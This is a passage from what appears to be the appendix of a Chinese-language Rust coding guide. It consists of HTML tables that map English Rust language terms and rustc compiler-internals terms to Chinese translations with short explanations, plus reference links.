<tr><td>phantom type</td><td>虚类型，虚位类型</td><td>phantom 相关的专有名词：<br>phantom bug 幻影指令<br>phantom power 幻象电源<br>参见：<a href="https://wiki.haskell.org/Phantom_type">Haskell</a>、<a href="https://en.wikibooks.org/wiki/Haskell/Phantom_types">Haskell/Phantom_type</a>、<br><a href="http://rustwiki.org/rust-by-example/generics/phantom.html">Rust/Phantom</a>、<a href="https://doc.rust-lang.org/std/marker/struct.PhantomData.html">stdlib/PhantomData</a></td></tr>
<tr><td>platform</td><td>平台</td><td></td></tr>
<tr><td>polymorphism</td><td>多态</td><td></td></tr>
<tr><td>powershell</td><td>（不译）</td><td>Windows 系统的一种命令行外壳程序<br>和脚本环境</td></tr>
<tr><td>possibility of absence</td><td>不存在的可能性</td><td></td></tr>
<tr><td>precede</td><td>预先？，在...发生（或出现）</td><td></td></tr>
<tr><td>prelude</td><td>（不译）</td><td>预先导入模块，英文本意：序曲，前奏</td></tr>
<tr><td>primitive types</td><td>原生类型，基本类型，简单类型</td><td></td></tr>
<tr><td>print</td><td>打印</td><td></td></tr>
<tr><td>process</td><td>进程</td><td></td></tr>
<tr><td>procedural macros</td><td>过程宏，程序宏</td><td></td></tr>
<tr><td>project</td><td>项目，工程</td><td></td></tr>
<tr><td>prototype</td><td>原型</td><td></td></tr>
<tr><td><strong>R</strong></td><td></td><td></td></tr>
<tr><td>race condition</td><td>竞态条件</td><td></td></tr>
<tr><td>RAII</td><td>资源获取即初始化（一般不译）</td><td>resource acquisition is initialization 的缩写</td></tr>
<tr><td>range</td><td>区间，范围</td><td></td></tr>
<tr><td>range expression</td><td>区间表达式</td><td></td></tr>
<tr><td>raw identifier</td><td>原始标识符</td><td></td></tr>
<tr><td>raw pointer</td><td>原始指针，裸指针</td><td></td></tr>
<tr><td>RC</td><td>引用计数</td><td>reference counted</td></tr>
<tr><td>Reader</td><td>读取器</td><td></td></tr>
<tr><td>recursive macro</td><td>递归宏</td><td></td></tr>
<tr><td>reference</td><td>引用</td><td></td></tr>
<tr><td>reference cycle</td><td>引用循环</td><td></td></tr>
<tr><td>release</td><td>发布</td><td></td></tr>
<tr><td>resource</td><td>资源</td><td></td></tr>
<tr><td>resource leak</td><td>资源泄露</td><td></td></tr>
<tr><td>RHS</td><td>右操作数</td><td>right-hand side 的非正式缩写，<br>与 LHS 相对</td></tr>
<tr><td>root directory</td><td>根目录</td><td></td></tr>
<tr><td>runtime</td><td>运行时</td><td></td></tr>
<tr><td>runtime behavior</td><td>运行时行为</td><td></td></tr>
<tr><td>runtime overhead</td><td>运行时开销</td><td></td></tr>
<tr><td>Rust</td><td>（不译）</td><td>一种编程语言</td></tr>
<tr><td>Rustacean</td><td>（不译）</td><td>编写 Rust 的程序员或爱好者的通称</td></tr>
<tr><td>rustc</td><td>（不译）</td><td>Rust 语言编译器</td></tr>
<tr><td>r-value</td><td>右值</td><td></td></tr>
<tr><td><strong>S</strong></td><td></td><td></td></tr>
<tr><td>scalar</td><td>标量，数量</td><td></td></tr>
<tr><td>schedule</td><td>调度</td><td></td></tr>
<tr><td>scope</td><td>作用域</td><td></td></tr>
<tr><td>screen</td><td>屏幕</td><td></td></tr>
<tr><td>script</td><td>脚本</td><td></td></tr>
<tr><td>semicolon</td><td>分号，“;”</td><td></td></tr>
<tr><td>self</td><td>自身，作关键字时不译</td><td></td></tr>
<tr><td>shadow</td><td>遮蔽，隐蔽，隐藏，覆盖</td><td></td></tr>
<tr><td>shallow copy</td><td>浅拷贝，浅复制</td><td></td></tr>
<tr><td>signature</td><td>标记</td><td></td></tr>
<tr><td>slice</td><td>切片</td><td></td></tr>
<tr><td>snake case</td><td>蛇形命名</td><td>参见：<a href="https://en.wikipedia.org/wiki/Snake_case">Snake case</a></td></tr>
<tr><td>source file</td><td>源文件</td><td></td></tr>
<tr><td>source code</td><td>源代码</td><td></td></tr>
<tr><td>specialization</td><td>泛型特化</td><td></td></tr>
<tr><td>square</td><td>平方，二次方，二次幂</td><td></td></tr>
<tr><td>square brackets</td><td>中括号，“[”和“]”</td><td></td></tr>
<tr><td>src</td><td>（不译）</td><td>source 的缩写，指源代码</td></tr>
<tr><td>stack</td><td>栈</td><td></td></tr>
<tr><td>stack unwind</td><td>栈解开、栈展开</td><td></td></tr>
<tr><td>statement</td><td>语句</td><td></td></tr>
<tr><td>statically allocated</td><td>静态分配</td><td></td></tr>
<tr><td>statically allocated string</td><td>静态分配的字符串</td><td></td></tr>
<tr><td>statically dispatch</td><td>静态分发</td><td></td></tr>
<tr><td>static method</td><td>静态方法</td><td></td></tr>
<tr><td>string</td><td>字符串</td><td></td></tr>
<tr><td>string literal</td><td>字符串常量</td><td></td></tr>
<tr><td>string slices</td><td>字符串片段</td><td></td></tr>
<tr><td>stringify</td><td>字符串化</td><td></td></tr>
<tr><td>subscript notation</td><td>下标</td><td></td></tr>
<tr><td>sugar</td><td>糖</td><td></td></tr>
<tr><td>super</td><td>父级，作关键字时不译</td><td></td></tr>
<tr><td>syntax context</td><td>语法上下文</td><td></td></tr>
<tr><td>systems programming language</td><td>系统级编程语言</td><td></td></tr>
<tr><td><strong>T</strong></td><td></td><td></td></tr>
<tr><td>tagged union</td><td>标记联合</td><td></td></tr>
<tr><td>target triple</td><td>多层次指标，三层/重 指标/目标</td><td>triple 本义是“三”，但此处虚指“多”，<br>此词翻译需要更多讨论</td></tr>
<tr><td>terminal</td><td>终端</td><td></td></tr>
<tr><td>testing</td><td>测试</td><td></td></tr>
<tr><td>testsuit</td><td>测试套件</td><td></td></tr>
<tr><td>the least significant bit (LSB)</td><td>最低数字位</td><td></td></tr>
<tr><td>the most significant bit (MSB)</td><td>最高数字位</td><td></td></tr>
<tr><td>thread</td><td>线程</td><td></td></tr>
<tr><td>TOML</td><td>（不译）</td><td>Tom's Obvious, Minimal Language <br>的缩写，一种配置语言</td></tr>
<tr><td>token tree</td><td>令牌树？</td><td>待进一步斟酌</td></tr>
<tr><td>trait</td><td>特质</td><td>其字面上有“特性，特征”之意</td></tr>
<tr><td>trait bound</td><td>特质约束</td><td>bound 有“约束，限制，限定”之意</td></tr>
<tr><td>trait object</td><td>特质对象</td><td></td></tr>
<tr><td>transmute</td><td>（不译）</td><td>其字面上有“变化，变形，变异”之意，<br>不作翻译</td></tr>
<tr><td>trivial</td><td>平凡的</td><td></td></tr>
<tr><td>troubleshooting</td><td>疑难解答，故障诊断，<br>故障排除，故障分析</td><td></td></tr>
<tr><td>tuple</td><td>元组</td><td></td></tr>
<tr><td>two's complement</td><td>补码，二补数</td><td></td></tr>
<tr><td>two-word object</td><td>双字对象</td><td></td></tr>
<tr><td>type annotation</td><td>类型标注</td><td></td></tr>
<tr><td>type erasure</td><td>类型擦除</td><td></td></tr>
<tr><td>type inference</td><td>类型推导</td><td></td></tr>
<tr><td>type inference engine</td><td>类型推导引擎</td><td></td></tr>
<tr><td>type parameter</td><td>类型参量</td><td></td></tr>
<tr><td>type placeholder</td><td>类型占位符</td><td></td></tr>
<tr><td>type signature</td><td>类型标记</td><td></td></tr>
<tr><td><strong>U</strong></td><td></td><td></td></tr>
<tr><td>undefined behavior</td><td>未定义行为</td><td></td></tr>
<tr><td>uninstall</td><td>卸载</td><td></td></tr>
<tr><td>unit-like struct</td><td>类单元结构体</td><td></td></tr>
<tr><td>unit struct</td><td>单元结构体</td><td></td></tr>
<tr><td>&quot;unit-style&quot; tests</td><td>单元测试</td><td></td></tr>
<tr><td>unit test</td><td>单元测试</td><td></td></tr>
<tr><td>unit type</td><td>单元类型</td><td></td></tr>
<tr><td>universal function call syntax <br>(UFCS)</td><td>通用函数调用语法</td><td></td></tr>
<tr><td>unsized types</td><td>不定长类型</td><td></td></tr>
<tr><td>unwind</td><td>展开</td><td></td></tr>
<tr><td>unwrap</td><td>解包</td><td>暂译！</td></tr>
<tr><td><strong>V</strong></td><td></td><td></td></tr>
<tr><td>variable binding</td><td>变量绑定</td><td></td></tr>
<tr><td>variable shadowing</td><td>变量遮蔽，变量隐蔽,<br>变量隐藏，变量覆盖</td><td></td></tr>
<tr><td>variable capture</td><td>变量捕获</td><td></td></tr>
<tr><td>variant</td><td>变量</td><td></td></tr>
<tr><td>vector</td><td>（动态数组，一般不译）</td><td>vector 本义是“向量”</td></tr>
<tr><td>visibility</td><td>可见性</td><td></td></tr>
<tr><td>vtable</td><td>虚表</td><td></td></tr>
<tr><td><strong>W</strong></td><td></td><td></td></tr>
<tr><td>where clause</td><td>where 子句，where 从句，where 分句</td><td>在数据库的官方手册中多翻译成“子句”，英语语法中翻译成“从句”</td></tr>
<tr><td>wrap</td><td>包裹</td><td>暂译！</td></tr>
<tr><td>wrapped</td><td>装包</td><td></td></tr>
<tr><td>wrapper</td><td>装包</td><td></td></tr>
<tr><td><strong>Y</strong></td><td></td><td></td></tr>
<tr><td>yield</td><td>产生(收益、效益等)，产出，提供</td><td></td></tr>
<tr><td><strong>Z</strong></td><td></td><td></td></tr>
<tr><td>zero-cost abstractions</td><td>零开销抽象</td><td></td></tr>
<tr><td>zero-width space(ZWSP)</td><td>零宽空格</td><td></td></tr>
</tbody></table>
<p><strong>参考</strong></p>
<p><a href="https://github.com/rust-lang-cn/english-chinese-glossary-of-rust/blob/master/rust-glossary.md">Rust 语言术语中英文对照表</a></p>
<h2 id="编译器相关术语表"><a class="header" href="#编译器相关术语表">编译器相关术语表</a></h2>
<table><thead><tr><th>术语</th><th>中文</th><th>意义</th></tr></thead><tbody>
<tr><td><span id="arena">arena/arena allocation</span>  </td><td><span id="arena">竞技场分配</span>  </td><td>arena 是一个大内存缓冲区，从中可以进行其他内存分配，这种分配方式称为竞技场分配。</td></tr>
<tr><td><span id="ast">AST</span>                       </td><td><span id="ast">抽象语法树</span>  </td><td>由<code>rustc_ast</code> crate 产生的抽象语法树。</td></tr>
<tr><td><span id="binder">binder</span>                 </td><td><span id="binder">绑定器</span>  </td><td>绑定器是声明变量和类型的地方。例如，<code>&lt;T&gt;</code> 是<code>fn foo&lt;T&gt;(..)</code>中泛型类型参数 <code>T</code>的绑定器，以及 |<code>a</code>|<code> ...</code>  是 参数<code>a</code>的绑定器。</td></tr>
<tr><td><span id="body-id">BodyId</span>                </td><td><span id="body-id"> 主体ID</span>  </td><td>一个标识符，指的是crate 中的一个特定主体（函数或常量的定义）。</td></tr>
<tr><td><span id="bound-var">bound variable</span>      </td><td><span id="bound-var">绑定变量</span>      </td><td>&quot;绑定变量 &quot;是在表达式/术语中声明的变量。例如，变量<code>a</code>被绑定在闭包表达式中|<code>a</code>|<code> a * 2</code>。</td></tr>
<tr><td><span id="codegen">codegen</span>               </td><td><span id="codegen">代码生成</span>               </td><td>由 MIR 转译为 LLVM IR。</td></tr>
<tr><td><span id="codegen-unit">codegen unit</span>     </td><td><span id="codegen-unit">代码生成单元</span>     </td><td>当生成LLVM IR时，编译器将Rust代码分成若干个代码生成单元（有时缩写为CGU）。这些单元中的每一个都是由LLVM独立处理的，实现了并行化。它们也是增量编译的单位。</td></tr>
<tr><td><span id="completeness">completeness</span>     </td><td><span id="completeness">完整性</span>     </td><td>类型理论中的一个技术术语，它意味着每个类型安全的程序也会进行类型检查。同时拥有健全性（soundness）和完整性（completeness）是非常困难的，而且通常健全性（soundness）更重要。</td></tr>
<tr><td><span id="cfg">control-flow graph</span>        </td><td><span id="cfg">控制流图</span>        </td><td>程序的控制流表示。</td></tr>
<tr><td><span id="ctfe">CTFE</span>                     </td><td><span id="ctfe">编译时函数求值</span>                     </td><td>编译时函数求值（Compile-Time Function Evaluation）的简称，是指编译器在编译时计算 &quot;const fn &quot;的能力。这是编译器常量计算系统的一部分。</td></tr>
<tr><td><span id="cx">cx</span>                         </td><td><span id="cx">上下文</span>                         </td><td>Rust 编译器内倾向于使用 &quot;cx &quot;作为上下文的缩写。另见 &quot;tcx&quot;、&quot;infcx &quot;等。</td></tr>
<tr><td><span id="ctxt">ctxt</span>                     </td><td><span id="ctxt">上下文（另一个缩写）</span>                     </td><td>我们也使用 &quot;ctxt &quot;作为上下文的缩写，例如， <a href="safe-guides/Appendix/terms.html#TyCtxt"><code>TyCtxt</code></a>，以及 <a href="safe-guides/Appendix/terms.html#cx">cx</a> 或 <a href="safe-guides/Appendix/terms.html#tcx">tcx</a>。</td></tr>
<tr><td><span id="dag">DAG</span>                       </td><td><span id="dag">有向无环图</span>                       </td><td>在编译过程中，一个有向无环图被用来跟踪查询之间的依赖关系</td></tr>
<tr><td><span id="data-flow">data-flow analysis</span>  </td><td><span id="data-flow">数据流分析</span>  </td><td>静态分析，找出程序控制流中每一个点的属性。</td></tr>
<tr><td><span id="debruijn">DeBruijn Index</span>       </td><td><span id="debruijn">德布鲁因索引</span>       </td><td>一种只用整数来描述一个变量被绑定的绑定器的技术。它的好处是，在变量重命名下，它是不变的。</td></tr>
<tr><td><span id="def-id">DefId</span>                  </td><td><span id="def-id">定义Id</span>                  </td><td>一个识别定义的索引（见<code>rustc_middle/src/hir/def_id.rs</code>）。<code>DefPath</code>的唯一标识。</td></tr>
<tr><td><span id="discriminant">discriminant</span>     </td><td><span id="discriminant">判别式</span>     </td><td>与枚举变体或生成器状态相关的基础值，以表明它是 &quot;激活的（avtive）&quot;（但不要与它的<a href="safe-guides/Appendix/terms.html#variant-idx">&quot;变体索引&quot;</a>混淆）。在运行时，激活变体的判别值被编码在<a href="safe-guides/Appendix/terms.html#tag">tag</a>中。</td></tr>
<tr><td><span id="double-ptr">double pointer</span>     </td><td><span id="double-ptr">双指针</span>     </td><td>一个带有额外元数据的指针。同指「胖指针」。</td></tr>
<tr><td><span id="drop-glue">drop glue</span>           </td><td><span id="drop-glue">drop胶水</span>           </td><td>(内部）编译器生成的指令，处理调用数据类型的析构器（<code>Drop</code>）。</td></tr>
<tr><td><span id="dst">DST</span>                       </td><td><span id="dst">DST</span>                       </td><td>Dynamically-Sized Type的缩写，这是一种编译器无法静态知道内存大小的类型（例如：<code>str'或</code>[u8]<code>）。这种类型没有实现</code>Sized<code>，不能在栈中分配。它们只能作为结构中的最后一个字段出现。它们只能在指针后面使用（例如：</code>&amp;str<code>或</code>&amp;[u8]`）。</td></tr>
<tr><td><span id="ebl">early-bound lifetime</span>      </td><td><span id="ebl">早绑定生存期</span>      </td><td>一个在其定义处被替换的生存期区域（region）。绑定在一个项目的<code>Generics'中，并使用</code>Substs'进行替换。与<strong>late-bound lifetime</strong>形成对比。</td></tr>
<tr><td><span id="empty-type">empty type</span>         </td><td><span id="empty-type">空类型</span>         </td><td>参考 &quot;uninhabited type&quot;.</td></tr>
<tr><td><span id="fat-ptr">fat pointer</span>           </td><td><span id="fat-ptr">胖指针</span>           </td><td>一个两字（word）的值，携带着一些值的地址，以及一些使用该值所需的进一步信息。Rust包括两种 &quot;胖指针&quot;：对切片（slice）的引用和特质（trait）对象。对切片的引用带有切片的起始地址和它的长度。特质对象携带一个值的地址和一个指向适合该值的特质实现的指针。&quot;胖指针 &quot;也被称为 &quot;宽指针&quot;，和 &quot;双指针&quot;。</td></tr>
<tr><td><span id="free-var">free variable</span>        </td><td><span id="free-var">自由变量</span>        </td><td>自由变量 是指没有被绑定在表达式或术语中的变量；</td></tr>
<tr><td><span id="generics">generics</span>             </td><td><span id="generics">泛型</span>             </td><td>通用类型参数集。</td></tr>
<tr><td><span id="hir">HIR</span>                       </td><td><span id="hir">高级中间语言</span>                       </td><td>高级中间语言，通过对AST进行降级（lowering）和去糖（desugaring）而创建。</td></tr>
<tr><td><span id="hir-id">HirId</span>                  </td><td><span id="hir-id">HirId</span>                  </td><td>通过结合“def-id”和 &quot;intra-definition offset&quot;来识别HIR中的一个特定节点。</td></tr>
<tr><td><span id="hir-map">HIR map</span>               </td><td><span id="hir-map">HIR map</span>               </td><td>通过<code>tcx.hir()</code>访问的HIR Map，可以让你快速浏览HIR并在各种形式的标识符之间进行转换。</td></tr>
<tr><td><span id="ice">ICE</span>                       </td><td><span id="ice">ICE</span>                       </td><td>内部编译器错误的简称，这是指编译器崩溃的情况。</td></tr>
<tr><td><span id="ich">ICH</span>                       </td><td><span id="ich">ICH</span>                       </td><td>增量编译哈希值的简称，它们被用作HIR和crate metadata等的指纹，以检查是否有变化。这在增量编译中是很有用的，可以查看crate的一部分是否发生了变化，应该重新编译。</td></tr>
<tr><td><span id="infcx">infcx</span>                   </td><td><span id="infcx">类型推导上下文</span>                   </td><td>类型推导上下文（<code>InferCtxt</code>）。</td></tr>
<tr><td><span id="inf-var">inference variable</span>    </td><td><span id="inf-var">推导变量</span>    </td><td>在进行类型或区域推理时，&quot;推导变量 &quot;是一种特殊的类型/区域，代表你试图推理的内容。想想代数中的X。例如，如果我们试图推断一个程序中某个变量的类型，我们就创建一个推导变量来代表这个未知的类型。</td></tr>
<tr><td><span id="intern">intern</span>                 </td><td><span id="intern">intern</span>                 </td><td>intern是指存储某些经常使用的常量数据，如字符串，然后用一个标识符（如`符号'）而不是数据本身来引用这些数据，以减少内存的使用和分配的次数。</td></tr>
<tr><td><span id="intrinsic">intrinsic</span>           </td><td><span id="intrinsic">内部函数</span>           </td><td>内部函数是在编译器本身中实现的特殊功能，但向用户暴露（通常是不稳定的）。它们可以做神奇而危险的事情。</td></tr>
<tr><td><span id="ir">IR</span>                         </td><td><span id="ir">IR</span>                         </td><td>Intermediate Representation的简称，是编译器中的一个通用术语。在编译过程中，代码被从原始源码（ASCII文本）转换为各种IR。在Rust中，这些主要是HIR、MIR和LLVM IR。每种IR都适合于某些计算集。例如，MIR非常适用于借用检查器，LLVM IR非常适用于codegen，因为LLVM接受它。</td></tr>
<tr><td><span id="irlo">IRLO</span>                     </td><td><span id="irlo">IRLO</span>                     </td><td><code>IRLO</code>或<code>irlo</code>有时被用作<a href="https://internals.rust-lang.org">internals.rust-lang.org</a>的缩写。</td></tr>
<tr><td><span id="item">item</span>                     </td><td><span id="item">语法项</span>                     </td><td>语言中的一种 &quot;定义&quot;，如静态、常量、使用语句、模块、结构等。具体来说，这对应于 &quot;item&quot;类型。</td></tr>
<tr><td><span id="lang-item">lang item</span>           </td><td><span id="lang-item">语言项</span>           </td><td>代表语言本身固有的概念的项目，如特殊的内置特质，如<code>同步</code>和<code>发送</code>；或代表操作的特质，如<code>添加</code>；或由编译器调用的函数。</td></tr>
<tr><td><span id="lbl">late-bound lifetime</span>       </td><td><span id="lbl">晚绑定生存期</span>       </td><td>一个在其调用位置被替换的生存期区域。绑定在HRTB中，由编译器中的特定函数替代，如<code>liberate_late_bound_regions</code>。与<strong>早绑定的生存期</strong>形成对比。</td></tr>
<tr><td><span id="local-crate">local crate</span>       </td><td><span id="local-crate">本地crate</span>       </td><td>目前正在编译的crate。这与 &quot;上游crate&quot;相反，后者指的是本地crate的依赖关系。</td></tr>
<tr><td><span id="lto">LTO</span>                       </td><td><span id="lto">LTO</span>                       </td><td>链接时优化（Link-Time Optimizations）的简称，这是LLVM提供的一套优化，在最终二进制文件被链接之前进行。这些优化包括删除最终程序中从未使用的函数，例如。_<a href="https://clang.llvm.org/docs/ThinLTO.html">ThinLTO</a>_是LTO的一个变种，旨在提高可扩展性和效率，但可能牺牲了一些优化。</td></tr>
<tr><td><span id="llvm">LLVM</span>                   </td><td><span id="llvm">LLVM</span>                   </td><td>(实际上不是一个缩写 :P) 一个开源的编译器后端。它接受LLVM IR并输出本地二进制文件。然后，各种语言（例如Rust）可以实现一个编译器前端，输出LLVM IR，并使用LLVM编译到所有LLVM支持的平台。</td></tr>
<tr><td><span id="memoization">memoization</span>       </td><td><span id="memoization">memoization</span>       </td><td>储存（纯）计算结果（如纯函数调用）的过程，以避免在未来重复计算。这通常是执行速度和内存使用之间的权衡。</td></tr>
<tr><td><span id="mir">MIR</span>                       </td><td><span id="mir">中级中间语言</span>                       </td><td>在类型检查后创建的中级中间语言，供borrowck和codegen使用。</td></tr>
<tr><td><span id="miri">miri</span>                     </td><td><span id="miri">mir解释器</span>                     </td><td>MIR的一个解释器，用于常量计算。</td></tr>
<tr><td><span id="mono">monomorphization</span>         </td><td><span id="mono">单态化</span>         </td><td>采取类型和函数的通用实现并将其与具体类型实例化的过程。例如，在代码中可能有<code>Vec&lt;T&gt;</code>，但在最终的可执行文件中，将为程序中使用的每个具体类型有一个<code>Vec</code>代码的副本（例如，<code>Vec&lt;usize&gt;</code>的副本，<code>Vec&lt;MyStruct&gt;</code>的副本，等等）。</td></tr>
<tr><td><span id="normalize">normalize</span>           </td><td><span id="normalize">归一化</span>           </td><td>转换为更标准的形式的一般术语，但在rustc的情况下，通常指的是关联类型归一化。</td></tr>
<tr><td><span id="newtype">newtype</span>               </td><td><span id="newtype">newtype</span>               </td><td>对其他类型的封装（例如，<code>struct Foo(T)</code>是<code>T</code>的一个 &quot;新类型&quot;）。这在Rust中通常被用来为索引提供一个更强大的类型。</td></tr>
<tr><td><span id="niche">niche</span>                   </td><td><span id="niche">利基</span>                   </td><td>一个类型的无效位模式<em>可用于</em>布局优化。有些类型不能有某些位模式。例如，&quot;非零*&quot;整数或引用&quot;&amp;T &quot;不能用0比特串表示。这意味着编译器可以通过利用无效的 &quot;利基值 &quot;来进行布局优化。这方面的一个应用实例是<a href="https://rust-lang.github.io/unsafe-code-guidelines/layout/enums.html#discriminant-elision-on-option-like-enums"><em>Discriminant elision on <code>Option</code>-like enums</em></a>，它允许使用一个类型的niche作为一个<code>enum</code>的<a href="safe-guides/Appendix/terms.html#tag">&quot;标签&quot;</a>，而不需要一个单独的字段。</td></tr>
<tr><td><span id="nll">NLL</span>                       </td><td><span id="nll">NLL</span>                       </td><td>这是非词法作用域生存期的简称，它是对Rust的借用系统的扩展，使其基于控制流图。</td></tr>
<tr><td><span id="node-id">node-id or NodeId</span>     </td><td><span id="node-id">node-id or NodeId</span>     </td><td>识别AST或HIR中特定节点的索引；逐渐被淘汰，被<code>HirId</code>取代。</td></tr>
<tr><td><span id="obligation">obligation</span>         </td><td><span id="obligation">obligation</span>         </td><td>必须由特质系统证明的东西。</td></tr>
<tr><td><span id="placeholder">placeholder</span>       </td><td><span id="placeholder">placeholder</span>       </td><td><strong>注意：skolemization被placeholder废弃</strong>一种处理围绕 &quot;for-all &quot;类型的子类型的方法（例如，<code>for&lt;'a&gt; fn(&amp;'a u32)</code>），以及解决更高等级的trait边界（例如，<code>for&lt;'a&gt; T: Trait&lt;'a&gt;</code>）。</td></tr>
<tr><td><span id="point">point</span>                   </td><td><span id="point">point</span>                   </td><td>在NLL分析中用来指代MIR中的某个特定位置；通常用来指代控制流图中的一个节点。</td></tr>
<tr><td><span id="polymorphize">polymorphize</span>     </td><td><span id="polymorphize">多态化</span>     </td><td>一种避免不必要的单态化的优化。</td></tr>
<tr><td><span id="projection">projection</span>         </td><td><span id="projection">投影</span>         </td><td>一个 &quot;相对路径 &quot;的一般术语，例如，<code>x.f</code>是一个 &quot;字段投影&quot;，而<code>T::Item</code>是一个&quot;关联类型投影&quot;</td></tr>
<tr><td><span id="pc">promoted constants</span>         </td><td><span id="pc">常量提升</span>         </td><td>从函数中提取的常量，并提升到静态范围</td></tr>
<tr><td><span id="provider">provider</span>             </td><td><span id="provider">provider</span>             </td><td>执行查询的函数。</td></tr>
<tr><td><span id="quantified">quantified</span>         </td><td><span id="quantified">量化</span>         </td><td>在数学或逻辑学中，存在量词和普遍量词被用来提出诸如 &quot;是否有任何类型的T是真的？&quot;或 &quot;这对所有类型的T都是真的吗？&quot;这样的问题</td></tr>
<tr><td><span id="query">query</span>                   </td><td><span id="query">查询</span>                   </td><td>编译过程中的一个子计算。查询结果可以缓存在当前会话中，也可以缓存到磁盘上，用于增量编译。</td></tr>
<tr><td><span id="recovery">recovery</span>             </td><td><span id="recovery">恢复</span>             </td><td>恢复是指在解析过程中处理无效的语法（例如，缺少逗号），并继续解析AST。这可以避免向用户显示虚假的错误（例如，当结构定义包含错误时，显示 &quot;缺少字段 &quot;的错误）。</td></tr>
<tr><td><span id="region">region</span>                 </td><td><span id="region">区域</span>                 </td><td>和生存期精彩使用的另一个术语。</td></tr>
<tr><td><span id="rib">rib</span>                       </td><td><span id="rib">rib</span>                       </td><td>名称解析器中的一个数据结构，用于跟踪名称的单一范围。</td></tr>
<tr><td><span id="scrutinee">scrutinee</div>            </td><td><span id="scrutinee">审查对象</div>            </td><td>审查对象是在<code>match</code>表达式和类似模式匹配结构中被匹配的表达式。例如，在<code>match x { A =&gt; 1, B =&gt; 2 }</code>中，表达式<code>x</code>是被审查者。</td></tr>
<tr><td><span id="sess">sess</span>                     </td><td><span id="sess">sess</span>                     </td><td>编译器会话，它存储了整个编译过程中使用的全局数据</td></tr>
<tr><td><span id="side-tables">side tables</span>       </td><td><span id="side-tables">side tables</span>       </td><td>由于AST和HIR一旦创建就不可改变，我们经常以哈希表的形式携带关于它们的额外信息，并以特定节点的ID为索引。</td></tr>
<tr><td><span id="sigil">sigil</span>                   </td><td><span id="sigil">符号</span>                   </td><td>就像一个关键词，但完全由非字母数字的标记组成。例如，<code>&amp;</code>是引用的标志。</td></tr>
<tr><td><span id="soundness">soundness</span>           </td><td><span id="soundness">健全性</span>           </td><td>类型理论中的一个技术术语。粗略的说，如果一个类型系统是健全的，那么一个进行类型检查的程序就是类型安全的。也就是说，人们永远不可能（在安全的Rust中）把一个值强加到一个错误类型的变量中。</td></tr>
<tr><td><span id="span">span</span>                     </td><td><span id="span">span</span>                     </td><td>用户的源代码中的一个位置，主要用于错误报告。这就像一个文件名/行号/列的立体元组：它们携带一个开始/结束点，也跟踪宏的扩展和编译器去糖。所有这些都被装在几个字节里（实际上，它是一个表的索引）。</td></tr>
<tr><td><span id="substs">substs</span>                 </td><td><span id="substs">替换</span>                 </td><td>给定的通用类型或项目的替换（例如，<code>HashMap&lt;i32, u32&gt;</code>中的<code>i32'、</code>u32'）。</td></tr>
<tr><td><span id="sysroot">sysroot</span>               </td><td><span id="sysroot">sysroot</span>               </td><td>用于编译器在运行时加载的构建工件的目录。</td></tr>
<tr><td><span id="tag">tag</span>                       </td><td><span id="tag">tag</span>                       </td><td>枚举/生成器的 &quot;标签 &quot;编码激活变体/状态的判别式(discriminant)。 标签可以是 &quot;直接的&quot;（简单地将判别式存储在一个字段中）或使用&quot;利基&quot;。</td></tr>
<tr><td><span id="tcx">tcx</span>                       </td><td><span id="tcx">tcx</span>                       </td><td>&quot;类型化上下文&quot;（<code>TyCtxt</code>），编译器的主要数据结构。</td></tr>
<tr><td><span id="lifetime-tcx">'tcx</span>           </td><td><span id="lifetime-tcx">'tcx</span>           </td><td><code>TyCtxt'所使用的分配区域的生存期。在编译过程中，大多数数据都会使用这个生存期，但HIR数据除外，它使用</code>'hir`生存期。</td></tr>
<tr><td><span id="token">token</span>                   </td><td><span id="token">词条</span>                   </td><td>解析的最小单位。词条是在词法运算后产生的</td></tr>
<tr><td><span id="tls">TLS</span>                     </td><td><span id="tls">TLS</span>                     </td><td>线程本地存储。变量可以被定义为每个线程都有自己的副本（而不是所有线程都共享该变量）。这与LLVM有一些相互作用。并非所有平台都支持TLS。</td></tr>
<tr><td><span id="trait-ref">trait reference</span>     </td><td><span id="trait-ref">trait 引用</span>     </td><td>一个特质的名称，以及一组合适的输入类型/生存期。</td></tr>
<tr><td><span id="trans">trans</span>                   </td><td><span id="trans">trans</span>                   </td><td>是 &quot;转译&quot;的简称，是将MIR转译成LLVM IR的代码。已经重命名为codegen。</td></tr>
<tr><td><span id="ty">Ty</span>                       </td><td><span id="ty">Ty</span>                       </td><td>一个类型的内部表示。</td></tr>
<tr><td><span id="tyctxt">TyCtxt</span>                 </td><td><span id="tyctxt">TyCtxt</span>                 </td><td>在代码中经常被称为tcx的数据结构，它提供对会话数据和查询系统的访问。</td></tr>
<tr><td><span id="ufcs">UFCS</span>                     </td><td><span id="ufcs">UFCS</span>                     </td><td>通用函数调用语法（Universal Function Call Syntax）的简称，这是一种调用方法的明确语法。</td></tr>
<tr><td><span id="ut">uninhabited type</span>           </td><td><span id="ut">孤类型</span>           </td><td>一个没有值的类型。这与ZST不同，ZST正好有一个值。一个孤类型的例子是<code>enum Foo {}</code>，它没有变体，所以，永远不能被创建。编译器可以将处理孤类型的代码视为死代码，因为没有这样的值可以操作。<code>！</code>（从未出现过的类型）是一个孤类型。孤类型也被称为 &quot;空类型&quot;。</td></tr>
<tr><td><span id="upvar">upvar</span>                   </td><td><span id="upvar">upvar</span>                   </td><td>一个闭合体从闭合体外部捕获的变量</td></tr>
<tr><td><span id="variance">variance</span>             </td><td><span id="variance">型变</span>             </td><td>确定通用类型/寿命参数的变化如何影响子类型；例如，如果<code>T</code>是<code>U</code>的子类型，那么<code>Vec&lt;T&gt;</code>是<code>Vec&lt;U&gt;</code>的子类型，因为<code>Vec</code>在其通用参数中是协变的。</td></tr>
<tr><td><span id="variant-idx">variant index</span>     </td><td><span id="variant-idx">变体索引</span>     </td><td>在一个枚举中，通过给它们分配从0开始的索引来识别一个变体。这纯粹是内部的，不要与&quot;判别式&quot;相混淆，后者可以被用户覆盖（例如，<code>enum Bool { True = 42, False = 0 }</code>）。</td></tr>
<tr><td><span id="wide-ptr">wide pointer</span>         </td><td><span id="wide-ptr">宽指针</span>         </td><td>一个带有额外元数据的指针。</td></tr>
<tr><td><span id="zst">ZST</span>                       </td><td><span id="zst">ZST</span>                       </td><td>零大小类型。这种类型，其值的大小为0字节。由于<code>2^0 = 1</code>，这种类型正好有一个值。例如，<code>()</code>（单位）是一个ZST。<code>struct Foo;</code>也是一个ZST。编译器可以围绕ZST做一些很好的优化。</td></tr>
</tbody></table>
<p><strong>参考</strong></p>
<p><a href="https://rustcrustc.github.io/rustc-dev-guide-zh/appendix/glossary.html">Rust 编译器内部术语中英文对照表</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="d模版"><a class="header" href="#d模版">D.模版</a></h1>
